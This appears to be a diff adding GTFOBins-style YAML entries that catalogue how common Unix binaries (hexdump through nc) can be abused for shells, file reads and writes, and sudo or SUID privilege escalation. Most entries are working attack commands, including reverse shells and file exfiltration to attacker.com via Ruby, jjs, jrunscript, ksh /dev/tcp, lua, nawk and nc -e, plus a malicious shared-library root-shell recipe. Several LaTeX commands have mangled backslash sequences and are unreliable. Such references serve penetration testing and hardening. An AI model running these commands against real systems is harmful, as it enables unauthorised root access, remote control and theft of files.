+hexdump -C "$LFILE"
+suid:
+- code: |
+LFILE=file_to_read
+./hexdump -C "$LFILE"
+sudo:
+- code: |
+LFILE=file_to_read
+sudo hexdump -C "$LFILE"
+---
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+highlight --no-doc --failsafe "$LFILE"
+suid:
+- code: |
+LFILE=file_to_read
+./highlight --no-doc --failsafe "$LFILE"
+sudo:
+- code: |
+LFILE=file_to_read
+sudo highlight --no-doc --failsafe "$LFILE"
+---
+functions:
+shell:
+- code: |
+hping3
+/bin/sh
+suid:
+- code: |
+./hping3
+/bin/sh -p
+sudo:
+- code: |
+sudo hping3
+/bin/sh
+---
+description: The `8859_1` encoding is used as it accepts any single-byte sequence, thus it allows to read/write arbitrary files. Other encoding combinations may corrupt the result.
+functions:
+file-write:
+- code: |
+LFILE=file_to_write
+echo "DATA" | iconv -f 8859_1 -t 8859_1 -o "$LFILE"
+file-read:
+- code: |
+LFILE=file_to_read
+iconv -f 8859_1 -t 8859_1 "$LFILE"
+suid:
+- code: |
+LFILE=file_to_read
+./iconv -f 8859_1 -t 8859_1 "$LFILE"
+sudo:
+- code: |
+LFILE=file_to_read
+./iconv -f 8859_1 -t 8859_1 "$LFILE"
+---
+description: This requires `iftop` 0.17 and the privilege to capture on some device (specify with `-i` if needed) .
+functions:
+shell:
+- code: |
+iftop
+!/bin/sh
+limited-suid:
+- code: |
+./iftop
+!/bin/sh
+sudo:
+- code: |
+sudo iftop
+!/bin/sh
+---
+description: This can be run with elevated privileges to change permissions (`6` denotes the SUID bits) and then read, write, or execute a copy of the file.
+functions:
+suid:
+- code: |
+LFILE=file_to_change
+TF=$(mktemp)
+./install -m 6777 $LFILE $TF
+sudo:
+- code: |
+LFILE=file_to_change
+TF=$(mktemp)
+sudo install -m 6777 $LFILE $TF
+---
+functions:
+shell:
+- code: ionice /bin/sh
+suid:
+- code: ./ionice /bin/sh -p
+sudo:
+- code: sudo ionice /bin/sh
+---
+description: |
+The read file content is corrupted by error prints.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+ip -force -batch "$LFILE"
+suid:
+- code: |
+LFILE=file_to_read
+./ip -force -batch "$LFILE"
+- description: This only works for Linux with CONFIG_NET_NS=y.
+code: |
+./ip netns add foo
+./ip netns exec foo /bin/sh -p
+./ip netns delete foo
+sudo:
+- code: |
+LFILE=file_to_read
+sudo ip -force -batch "$LFILE"
+- description: This only works for Linux with CONFIG_NET_NS=y.
+code: |
+sudo ip netns add foo
+sudo ip netns exec foo /bin/sh
+sudo ip netns delete foo
+---
+functions:
+shell:
+- code: |
+irb
+exec '/bin/bash'
+reverse-shell:
+- description: Run `nc -l -p 12345` on the attacker box to receive the shell.
+code: |
+export RHOST='127.0.0.1'
+export RPORT=9000
+irb
+require 'socket'; exit if fork;c=TCPSocket.new(ENV["RHOST"],ENV["RPORT"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read} end
+file-upload:
+- description: Serve files in the local folder running an HTTP server on port 8888.
+code: |
+irb
+require 'webrick'; WEBrick::HTTPServer.new(:Port => 8888, :DocumentRoot => Dir.pwd).start;
+file-download:
+- description: Fetch a remote file via HTTP GET request.
+code: |
+export URL=http://attacker.com/file_to_get
+export LFILE=file_to_save
+irb
+require 'open-uri'; download = open(ENV['URL']); IO.copy_stream(download, ENV['LFILE'])
+file-write:
+- code: |
+irb
+File.open("file_to_write", "w+") { |f| f.write("DATA") }
+file-read:
+- code: |
+irb
+puts File.read("file_to_read")
+library-load:
+- code: |
+irb
+require "fiddle"; Fiddle.dlopen("lib.so")
+sudo:
+- code: |
+sudo irb
+exec '/bin/bash'
+---
+functions:
+shell:
+- code: |
+ispell /etc/passwd
+!/bin/sh
+suid:
+- code: |
+./ispell /etc/passwd
+!/bin/sh -p
+sudo:
+- code: |
+sudo ispell /etc/passwd
+!/bin/sh
+---
+description: This tool is installed starting with Java SE 8.
+functions:
+shell:
+- code: echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()" | jjs
+reverse-shell:
+- description: Run `nc -l -p 12345` on the attacker box to receive the shell.
+code: |
+export RHOST=attacker.com
+export RPORT=12345
+echo 'var host=Java.type("java.lang.System").getenv("RHOST");
+var port=Java.type("java.lang.System").getenv("RPORT");
+var ProcessBuilder = Java.type("java.lang.ProcessBuilder");
+var p=new ProcessBuilder("/bin/bash", "-i").redirectErrorStream(true).start();
+var Socket = Java.type("java.net.Socket");
+var s=new Socket(host,port);
+var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
+var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type("java.lang.Thread").sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();' | jjs
+file-download:
+- description: Fetch a remote file via HTTP GET request.
+code: |
+export URL=http://attacker.com/file_to_get
+export LFILE=file_to_save
+echo "var URL = Java.type('java.net.URL');
+var ws = new URL('$URL');
+var Channels = Java.type('java.nio.channels.Channels');
+var rbc = Channels.newChannel(ws.openStream());
+var FileOutputStream = Java.type('java.io.FileOutputStream');
+var fos = new FileOutputStream('$LFILE');
+fos.getChannel().transferFrom(rbc, 0, Number.MAX_VALUE);
+fos.close();
+rbc.close();" | jjs
+file-write:
+- code: |
+echo 'var FileWriter = Java.type("java.io.FileWriter");
+var fw=new FileWriter("./file_to_write");
+fw.write("DATA");
+fw.close();' | jjs
+file-read:
+- code: |
+echo 'var BufferedReader = Java.type("java.io.BufferedReader");
+var FileReader = Java.type("java.io.FileReader");
+var br = new BufferedReader(new FileReader("file_to_read"));
+while ((line = br.readLine()) != null) { print(line); }' | jjs
+suid:
+- description: This has been found working in macOS but failing on Linux systems.
+code: echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()" | ./jjs
+sudo:
+- code: echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()" | sudo jjs
+---
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+join -a 2 /dev/null $LFILE
+suid:
+- code: |
+LFILE=file_to_read
+join -a 2 /dev/null $LFILE
+sudo:
+- code: |
+LFILE=file_to_read
+sudo join -a 2 /dev/null $LFILE
+---
+description: |
+This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
+
+This might not work if run by unprivileged users depending on the system configuration.
+functions:
+shell:
+- code: |
+journalctl
+!/bin/sh
+sudo:
+- code: |
+sudo journalctl
+!/bin/sh
+---
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+jq -Rr . "$LFILE"
+suid:
+- code: |
+LFILE=file_to_read
+./jq -Rr . "$LFILE"
+sudo:
+- code: |
+LFILE=file_to_read
+sudo jq -Rr . "$LFILE"
+---
+description: This tool is installed starting with Java SE 6.
+functions:
+shell:
+- code: jrunscript -e "exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')"
+reverse-shell:
+- description: Run `nc -l -p 12345` on the attacker box to receive the shell.
+code: |
+export RHOST=attacker.com
+export RPORT=12345
+jrunscript -e 'var host='"'""$RHOST""'"'; var port='"$RPORT"';
+var p=new java.lang.ProcessBuilder("/bin/bash", "-i").redirectErrorStream(true).start();
+var s=new java.net.Socket(host,port);
+var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
+var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){
+while(pi.available()>0)so.write(pi.read());
+while(pe.available()>0)so.write(pe.read());
+while(si.available()>0)po.write(si.read());
+so.flush();po.flush();
+java.lang.Thread.sleep(50);
+try {p.exitValue();break;}catch (e){}};p.destroy();s.close();'
+file-download:
+- description: Fetch a remote file via HTTP GET request.
+code: |
+URL=http://attacker.com/file_to_get
+LFILE=file_to_save
+jrunscript -e "cp('$URL','$LFILE')"
+file-write:
+- code: jrunscript -e 'var fw=new java.io.FileWriter("./file_to_write"); fw.write("DATA"); fw.close();'
+file-read:
+- code: jrunscript -e 'br = new BufferedReader(new java.io.FileReader("file_to_read"));
+while ((line = br.readLine()) != null) { print(line); }'
+suid:
+- description: This has been found working in macOS but failing on Linux systems.
+code: ./jrunscript -e "exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')"
+sudo:
+- code: sudo jrunscript -e "exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')"
+---
+functions:
+shell:
+- code: |
+jtag --interactive
+shell /bin/sh
+sudo:
+- code: |
+sudo jtag --interactive
+shell /bin/sh
+---
+description: This is capable of running [`ruby`](/gtfobins/ruby/) code.
+functions:
+shell:
+- code: |
+knife exec -E 'exec "/bin/sh"'
+sudo:
+- code: |
+sudo knife exec -E 'exec "/bin/sh"'
+---
+functions:
+shell:
+- code: ksh
+reverse-shell:
+- description: Run `nc -l -p 12345` on the attacker box to receive the shell.
+code: |
+export RHOST=attacker.com
+export RPORT=12345
+ksh -c 'ksh -i > /dev/tcp/$RHOST/$RPORT 2>&1 0>&1'
+file-upload:
+- description: Send local file in the body of an HTTP POST request. Run an HTTP service on the attacker box to collect the file.
+code: |
+export RHOST=attacker.com
+export RPORT=12345
+export LFILE=file_to_send
+ksh -c 'echo -e "POST / HTTP/0.9
+
+$(cat $LFILE)" > /dev/tcp/$RHOST/$RPORT'
+- description: Send local file using a TCP connection. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file.
+code: |
+export RHOST=attacker.com
+export RPORT=12345
+export LFILE=file_to_send
+ksh -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'
+file-download:
+- description: Fetch a remote file via HTTP GET request.
+code: |
+export RHOST=attacker.com
+export RPORT=12345
+export LFILE=file_to_get
+ksh -c '{ echo -ne "GET /$LFILE HTTP/1.0
+host: $RHOST
+
+" 1>&3; cat 0<&3; } \
+3<>/dev/tcp/$RHOST/$RPORT \
+| { while read -r; do [ "$REPLY" = "$(echo -ne "")" ] && break; done; cat; } > $LFILE'
+- description: Fetch remote file using a TCP connection. Run `nc -l -p 12345 < "file_to_send"` on the attacker box to send the file.
+code: |
+export RHOST=attacker.com
+export RPORT=12345
+export LFILE=file_to_get
+ksh -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'
+file-write:
+- code: |
+export LFILE=file_to_write
+ksh -c 'echo DATA > $LFILE'
+file-read:
+- description: It trims trailing newlines.
+code: |
+export LFILE=file_to_read
+ksh -c 'echo "$(<$LFILE)"'
+- description: It trims trailing newlines.
+code: |
+export LFILE=file_to_read
+ksh -c $'read -r -d \x04 < "$LFILE"; echo "$REPLY"'
+suid:
+- code: ./ksh -p
+sudo:
+- code: sudo ksh
+---
+description: |
+Each line is corrupted by a prefix string. Also consider that lines are actually parsed as `kickstart` scripts thus some file contents may lead to unexpected results.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+ksshell -i $LFILE
+suid:
+- code: |
+LFILE=file_to_read
+./ksshell -i $LFILE
+sudo:
+- code: |
+LFILE=file_to_read
+sudo ksshell -i $LFILE
+---
+description: It serves files from a specified directory via HTTP, i.e., `http://<IP>:4444/x/<file>`.
+functions:
+file-upload:
+- code: |
+LFILE=dir_to_serve
+kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/
+suid:
+- code: |
+LFILE=dir_to_serve
+./kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/
+sudo:
+- code: |
+LFILE=dir_to_serve
+sudo kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/
+---
+functions:
+shell:
+- code: |
+latex --shell-escape '\documentclass{article}egin{document}\immediate\write18{/bin/sh}nd{document}'
+file-read:
+- description: The read file will be part of the output.
+code: |
+latex '\documentclass{article}\usepackage{verbatim}egin{document}erbatiminput{file_to_read}nd{document}'
+strings article.dvi
+sudo:
+- description: The read file will be part of the output.
+code: |
+sudo latex '\documentclass{article}\usepackage{verbatim}egin{document}erbatiminput{file_to_read}nd{document}'
+strings article.dvi
+- code: |
+sudo latex --shell-escape '\documentclass{article}egin{document}\immediate\write18{/bin/sh}nd{document}'
+limited-suid:
+- code: |
+./latex --shell-escape '\documentclass{article}egin{document}\immediate\write18{/bin/sh}nd{document}'
+---
+description: This allows to execute [`perl`](/gtfobins/perl/) code.
+functions:
+shell:
+- code: |
+latexmk -e 'exec "/bin/sh";'
+- code: |
+latexmk -latex='/bin/sh #' /dev/null
+file-read:
+- code: |
+latexmk -e 'open(X,"/etc/passwd");while(<X>){print $_;}exit'
+- description: The read file will be part of the output.
+code: |
+TF=$(mktemp)
+echo '\documentclass{article}\usepackage{verbatim}egin{document}erbatiminput{file_to_read}nd{document}' >$TF
+strings tmp.dvi
+sudo:
+- code: sudo latexmk -e 'exec "/bin/sh";'
+---
+description: |
+`ld.so` is the Linux dynamic linker/loader, its filename and location might change across distributions. The proper path is can be obtained with:
+
+```
+$ strings /proc/self/exe | head -1
+/lib64/ld-linux-x86-64.so.2
+```
+functions:
+shell:
+- code: /lib/ld.so /bin/sh
+suid:
+- code: ./ld.so /bin/sh -p
+sudo:
+- code: sudo /lib/ld.so /bin/sh
+---
+description: |
+Follows a minimal example of how to use the described technique (details may change across different distributions).
+
+Run the code associated with the technique.
+
+Identify a target SUID executable, for example the `libcap` library of `ping`:
+
+```
+$ ldd /bin/ping | grep libcap
+libcap.so.2 => /tmp/tmp.9qfoUyKaGu/libcap.so.2 (0x00007fc7e9797000)
+```
+
+Create a fake library that spawns a shell at bootstrap:
+
+```
+echo '#include <unistd.h>
+
+__attribute__((constructor))
+static void init() {
+execl("/bin/sh", "/bin/sh", "-p", NULL);
+}
+' >"$TF/lib.c"
+```
+
+Compile it with:
+
+```
+gcc -fPIC -shared "$TF/lib.c" -o "$TF/libcap.so.2"
+```
+
+Run `ldconfig` again as described below then just run `ping` to obtain a root shell:
+
+```
+$ ping
+# id
+uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)
+```
+functions:
+sudo:
+- description: This allows to override one or more shared libraries. Beware though that it is easy to *break* target and other binaries.
+code: |
+TF=$(mktemp -d)
+echo "$TF" > "$TF/conf"
+# move malicious libraries in $TF
+sudo ldconfig -f "$TF/conf"
+limited-suid:
+- description: This allows to override one or more shared libraries. Beware though that it is easy to *break* target and other binaries.
+code: |
+TF=$(mktemp -d)
+echo "$TF" > "$TF/conf"
+# move malicious libraries in $TF
+./ldconfig -f "$TF/conf"
+---
+functions:
+shell:
+- code: |
+less /etc/profile
+!/bin/sh
+- code: |
+VISUAL="/bin/sh -c '/bin/sh'" less /etc/profile
+v
+file-read:
+- code: less file_to_read
+- description: This is useful when `less` is used as a pager by another binary to read a different file.
+code: |
+less /etc/profile
+:e file_to_read
+file-write:
+- code: |
+echo DATA | less
+sfile_to_write
+q
+- description: This invokes the default editor to edit the file. The file must exist.
+code: |
+less file_to_write
+v
+sudo:
+- code: |
+sudo less /etc/profile
+!/bin/sh
+suid:
+- code: ./less file_to_read
+---
+functions:
+shell:
+- code: lftp -c '!/bin/sh'
+limited-suid:
+- code: ./lftp -c '!/bin/sh'
+sudo:
+- code: sudo lftp -c '!/bin/sh'
+---
+description: This overrides `ln` itself with a symlink to a shell (or any other executable) that is to be executed as root, useful in case a `sudo` rule allows to only run `ln` by path. Warning, this is a destructive action.
+functions:
+sudo:
+- code: |
+sudo ln -fs /bin/sh /bin/ln
+sudo ln
+---
+description: |
+This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
+
+This might not work if run by unprivileged users depending on the system configuration.
+functions:
+shell:
+- code: |
+loginctl user-status
+!/bin/sh
+sudo:
+- code: |
+sudo loginctl user-status
+!/bin/sh
+---
+functions:
+shell:
+- code: logsave /dev/null /bin/sh -i
+sudo:
+- code: sudo logsave /dev/null /bin/sh -i
+suid:
+- code: ./logsave /dev/null /bin/sh -i -p
+---
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+look '' "$LFILE"
+suid:
+- code: |
+LFILE=file_to_read
+./look '' "$LFILE"
+sudo:
+- code: |
+LFILE=file_to_read
+sudo look '' "$LFILE"
+---
+functions:
+file-upload:
+- description: |
+To collect the file run the following on the attacker box (this requires `cups` to be installed):
+
+1. `lpadmin -p printer -v socket://localhost -E` to create a virtual printer;
+2. `lpadmin -d printer` to set the new printer as default;
+3. `cupsctl --remote-any` to enable printing from the Internet;
+4. `nc -lkp 9100` to receive the file.
+
+Send a local file to a CUPS server.
+code: |
+LFILE=file_to_send
+RHOST=attacker.com
+lp $LFILE -h $RHOST
+---
+functions:
+file-read:
+- description: The file is parsed as a configuration file and its content is shown as error messages, thus this is not suitable to exfiltrate binary files.
+code: |
+LFILE=file_to_read
+ltrace -F $LFILE /dev/null
+file-write:
+- description: The data to be written appears amid the library function call log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough. More generally, any binary that executes whatever library function call passing arbitrary data can be used in place of `ltrace -F DATA`.
+code: |
+LFILE=file_to_write
+ltrace -s 999 -o $LFILE ltrace -F DATA
+shell:
+- code: ltrace -b -L /bin/sh
+sudo:
+- code: sudo ltrace -b -L /bin/sh
+---
+functions:
+shell:
+- code: lua -e 'os.execute("/bin/sh")'
+non-interactive-reverse-shell:
+- description: Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires `lua-socket` installed.
+code: |
+export RHOST=attacker.com
+export RPORT=12345
+lua -e 'local s=require("socket");
+local t=assert(s.tcp());
+t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
+while true do
+local r,x=t:receive();local f=assert(io.popen(r,"r"));
+local b=assert(f:read("*a"));t:send(b);
+end;
+f:close();t:close();'
+non-interactive-bind-shell:
+- description: Run `nc target.com 12345` on the attacker box to connect to the shell. This requires `lua-socket` installed.
+code: |
+export LPORT=12345
+lua -e 'local k=require("socket");
+local s=assert(k.bind("*",os.getenv("LPORT")));
+local c=s:accept();
+while true do
+local r,x=c:receive();local f=assert(io.popen(r,"r"));
+local b=assert(f:read("*a"));c:send(b);
+end;c:close();f:close();'
+file-upload:
+- description: Send a local file via TCP. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file. This requires `lua-socket` installed.
+code: |
+RHOST=attacker.com
+RPORT=12345
+LFILE=file_to_send
+lua -e '
+local f=io.open(os.getenv("LFILE"), 'rb')
+local d=f:read("*a")
+io.close(f);
+local s=require("socket");
+local t=assert(s.tcp());
+t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
+t:send(d);
+t:close();'
+file-download:
+- description: Fetch a remote file via TCP. Run `nc target.com 12345
+< "file_to_send"` on the attacker box to send the file. This requires `lua-socket` installed.
+code: |
+export LPORT=12345
+export LFILE=file_to_save
+lua -e 'local k=require("socket");
+local s=assert(k.bind("*",os.getenv("LPORT")));
+local c=s:accept();
+local d,x=c:receive("*a");
+c:close();
+local f=io.open(os.getenv("LFILE"), "wb");
+f:write(d);
+io.close(f);'
+file-write:
+- code: lua -e 'local f=io.open("file_to_write", "wb"); f:write("DATA"); io.close(f);'
+file-read:
+- code: lua -e 'local f=io.open("file_to_read", "rb"); print(f:read("*a")); io.close(f);'
+suid:
+- code: lua -e 'local f=io.open("file_to_read", "rb"); print(f:read("*a")); io.close(f);'
+sudo:
+- code: sudo lua -e 'os.execute("/bin/sh")'
+limited-suid:
+- code: ./lua -e 'os.execute("/bin/sh")'
+---
+description: This allows to execute [`lua`](/gtfobins/lua/) code.
+functions:
+shell:
+- code: lualatex -shell-escape '\documentclass{article}egin{document}\directlua{os.execute("/bin/sh")}nd{document}'
+sudo:
+- code: sudo lualatex -shell-escape '\documentclass{article}egin{document}\directlua{os.execute("/bin/sh")}nd{document}'
+limited-suid:
+- code: ./lualatex -shell-escape '\documentclass{article}egin{document}\directlua{os.execute("/bin/sh")}nd{document}'
+---
+description: This allows to execute [`lua`](/gtfobins/lua/) code.
+functions:
+shell:
+- code: luatex -shell-escape '\directlua{os.execute("/bin/sh")}nd'
+sudo:
+- code: sudo luatex -shell-escape '\directlua{os.execute("/bin/sh")}nd'
+limited-suid:
+- code: ./luatex -shell-escape '\directlua{os.execute("/bin/sh")}nd'
+---
+description: Fetch a remote file via HTTP GET request.
+functions:
+file-download:
+- code: |
+URL=http://attacker.com/file_to_get
+LFILE=file_to_save
+lwp-download $URL $LFILE
+sudo:
+- code: |
+URL=http://attacker.com/file_to_get
+LFILE=file_to_save
+sudo lwp-download $URL $LFILE
+file-read:
+- description: The file path must be absolute.
+code: |
+LFILE=file_to_read
+TF=$(mktemp)
+lwp-download "file://$LFILE" $TF
+cat $TF
+file-write:
+- code: |
+LFILE=file_to_write
+TF=$(mktemp)
+echo DATA >$TF
+lwp-download file://$TF $LFILE
+---
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+lwp-request "file://$LFILE"
+sudo:
+- code: |
+LFILE=file_to_read
+sudo lwp-request "file://$LFILE"
+---
+functions:
+shell:
+- description: GNU version only.
+code: mail --exec='!/bin/sh'
+- description: This creates a valid Mbox file which may be required by the binary.
+code: |
+TF=$(mktemp)
+echo "From nobody@localhost $(date)" > $TF
+mail -f $TF
+!/bin/sh
+sudo:
+- description: GNU version only.
+code: sudo mail --exec='!/bin/sh'
+---
+description: All these examples only work with GNU `make` due to the lack of support of the `--eval` flag. The same can be achieved by using a proper `Makefile` or by passing the content via stdin using `-f -`.
+functions:
+shell:
+- code: |
+COMMAND='/bin/sh'
+make -s --eval=$'x:
+	-'"$COMMAND"
+file-write:
+- description: Requires a newer GNU `make` version.
+code: |
+LFILE=file_to_write
+make -s --eval="\$(file >$LFILE,DATA)" .
+suid:
+- code: |
+COMMAND='/bin/sh -p'
+./make -s --eval=$'x:
+	-'"$COMMAND"
+sudo:
+- code: |
+COMMAND='/bin/sh'
+sudo make -s --eval=$'x:
+	-'"$COMMAND"
+---
+description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
+functions:
+shell:
+- code: |
+man man
+!/bin/sh
+- description: This only works for GNU `man` and requires GNU `troff` (`groff` to be installed).
+code: |
+man '-H/bin/sh #' man
+file-read:
+- code: man file_to_read
+sudo:
+- code: |
+sudo man man
+!/bin/sh
+---
+functions:
+shell:
+- code: mawk 'BEGIN {system("/bin/sh")}'
+file-write:
+- code: |
+LFILE=file_to_write
+mawk -v LFILE=$LFILE 'BEGIN { print "DATA" > LFILE }'
+file-read:
+- code: |
+LFILE=file_to_read
+mawk '//' "$LFILE"
+suid:
+- code: |
+LFILE=file_to_read
+./mawk '//' "$LFILE"
+sudo:
+- code: sudo mawk 'BEGIN {system("/bin/sh")}'
+limited-suid:
+- code: ./mawk 'BEGIN {system("/bin/sh")}'
+---
+functions:
+shell:
+- code: |
+TERM= more /etc/profile
+!/bin/sh
+file-read:
+- code: more file_to_read
+suid:
+- code: ./more file_to_read
+sudo:
+- code: |
+TERM= sudo more /etc/profile
+!/bin/sh
+---
+description: The file is actually parsed and the first wrong line (ending with a newline or a null character) is returned in an error message, thus it may not be suitable for reading arbitrary files
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+mosquitto -c "$LFILE"
+suid:
+- code: |
+LFILE=file_to_read
+./mosquitto -c "$LFILE"
+sudo:
+- code: |
+LFILE=file_to_read
+sudo mosquitto -c "$LFILE"
+---
+functions:
+sudo:
+- description: Exploit the fact that `mount` can be executed via `sudo` to *replace* the `mount` binary with a shell.
+code: |
+sudo mount -o bind /bin/sh /bin/mount
+sudo mount
+---
+description: The file is parsed and displayed as a Java `.properties` file, so this may not be suitable to read arbitrary binary data.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+msgattrib -P $LFILE
+sudo:
+- code: |
+LFILE=file_to_read
+sudo msgattrib -P $LFILE
+suid:
+- code: |
+LFILE=file_to_read
+./msgattrib -P $LFILE
+---
+description: The file is parsed and displayed as a Java `.properties` file, so this may not be suitable to read arbitrary binary data.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+msgcat -P $LFILE
+sudo:
+- code: |
+LFILE=file_to_read
+sudo msgcat -P $LFILE
+suid:
+- code: |
+LFILE=file_to_read
+./msgcat -P $LFILE
+---
+description: The file is parsed and displayed as a Java `.properties` file, so this may not be suitable to read arbitrary binary data.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+msgconv -P $LFILE
+sudo:
+- code: |
+LFILE=file_to_read
+sudo msgconv -P $LFILE
+suid:
+- code: |
+LFILE=file_to_read
+./msgconv -P $LFILE
+---
+functions:
+shell:
+- description: Any text file will do as the input (use `-i`). `kill` is needed to spawn the shell only once.
+code: |
+echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'
+file-read:
+- description: The file is parsed and displayed as a Java `.properties` file, so this may not be suitable to read arbitrary binary data. `/bin/cat` can be replaced with any other *filter* program.
+code: |
+LFILE=file_to_read
+msgfilter -P -i "LFILE" /bin/cat
+sudo:
+- description: Any text file will do as the input (use `-i`). `kill` is needed to spawn the shell only once.
+code: |
+echo x | sudo msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'
+suid:
+- description: Any text file will do as the input (use `-i`). `kill` is needed to spawn the shell only once.
+code: |
+echo x | ./msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'
+---
+description: The file is parsed and displayed as a Java `.properties` file, so this may not be suitable to read arbitrary binary data.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+msgmerge -P $LFILE /dev/null
+sudo:
+- code: |
+LFILE=file_to_read
+sudo msgmerge -P $LFILE /dev/null
+suid:
+- code: |
+LFILE=file_to_read
+./msgmerge -P $LFILE /dev/null
+---
+description: The file is parsed and displayed as a Java `.properties` file, so this may not be suitable to read arbitrary binary data.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+msguniq -P $LFILE
+sudo:
+- code: |
+LFILE=file_to_read
+sudo msguniq -P $LFILE
+suid:
+- code: |
+LFILE=file_to_read
+./msguniq -P $LFILE
+---
+description: |
+The read file content is corrupted by error prints.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+mtr --raw -F "$LFILE"
+sudo:
+- code: |
+LFILE=file_to_read
+sudo mtr --raw -F "$LFILE"
+---
+functions:
+shell:
+- code: multitime /bin/sh
+suid:
+- code: ./multitime /bin/sh -p
+sudo:
+- code: sudo multitime /bin/sh
+---
+description: This can be used to move and then read or write files from a restricted file systems or with elevated privileges.
+functions:
+suid:
+- code: |
+LFILE=file_to_write
+TF=$(mktemp)
+echo "DATA" > $TF
+./mv $TF $LFILE
+sudo:
+- code: |
+LFILE=file_to_write
+TF=$(mktemp)
+echo "DATA" > $TF
+sudo mv $TF $LFILE
+---
+description: A valid MySQL server must be available.
+functions:
+shell:
+- code: mysql -e '\! /bin/sh'
+sudo:
+- code: sudo mysql -e '\! /bin/sh'
+limited-suid:
+- code: ./mysql -e '\! /bin/sh'
+library-load:
+- description: |
+A MySQL server must accept connections in order for this to work.
+
+The following loads the `/path/to/lib.so` shared object.
+code: mysql --default-auth ../../../../../path/to/lib
+---
+functions:
+shell:
+- code: |
+nano
+^R^X
+reset; sh 1>&0 2>&0
+- description: The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.
+code: |
+nano -s /bin/sh
+/bin/sh
+^T
+file-write:
+- code: |
+nano file_to_write
+DATA
+^O
+file-read:
+- code: nano file_to_read
+limited-suid:
+- description: The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.
+code: |
+./nano -s /bin/sh
+/bin/sh
+^T
+sudo:
+- code: |
+sudo nano
+^R^X
+reset; sh 1>&0 2>&0
+---
+description: The file content is treated as command line options and disclosed throught error messages, so this is not suitable for reading arbitrary binary data.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+nasm -@ $LFILE
+suid:
+- code: |
+LFILE=file_to_read
+./nasm -@ $LFILE
+sudo:
+- code: |
+LFILE=file_to_read
+sudo nasm -@ $LFILE
+---
+functions:
+shell:
+- code: nawk 'BEGIN {system("/bin/sh")}'
+non-interactive-reverse-shell:
+- description: Run `nc -l -p 12345` on the attacker box to receive the shell.
+code: |
+RHOST=attacker.com
+RPORT=12345
+nawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {
+s = "/inet/tcp/0/" RHOST "/" RPORT;
+while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
+while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
+non-interactive-bind-shell:
+- description: Run `nc target.com 12345` on the attacker box to connect to the shell.
+code: |
+LPORT=12345
+nawk -v LPORT=$LPORT 'BEGIN {
+s = "/inet/tcp/" LPORT "/0/0";
+while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
+while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
+file-write:
+- code: |
+LFILE=file_to_write
+nawk -v LFILE=$LFILE 'BEGIN { print "DATA" > LFILE }'
+file-read:
+- code: |
+LFILE=file_to_read
+nawk '//' "$LFILE"
+suid:
+- code: |
+LFILE=file_to_read
+./nawk '//' "$LFILE"
+sudo:
+- code: sudo nawk 'BEGIN {system("/bin/sh")}'
+limited-suid:
+- code: ./nawk 'BEGIN {system("/bin/sh")}'
+---
+functions:
+reverse-shell:
+- description: Run `nc -l -p 12345` on the attacker box to receive the shell. This only works with netcat traditional.
+code: |
+RHOST=attacker.com
+RPORT=12345
+nc -e /bin/sh $RHOST $RPORT
+bind-shell:
